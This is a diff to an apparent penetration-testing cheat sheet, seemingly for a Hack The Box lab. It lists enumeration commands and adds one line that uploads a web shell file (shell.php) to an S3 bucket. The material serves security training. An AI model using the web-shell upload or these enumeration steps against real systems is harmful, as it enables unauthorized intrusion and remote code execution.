@@ -66,6 +66,7 @@ cadaver [IP_ADDR]
 cewl [URL]    # get possible password from site
 wpscan --url    # or manually browse to /wp-content/plugins/ if no plugins found
 aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb   # aws s3 bucket list
+aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb   # upload file
 ```
 
 ### Kerberos (88)
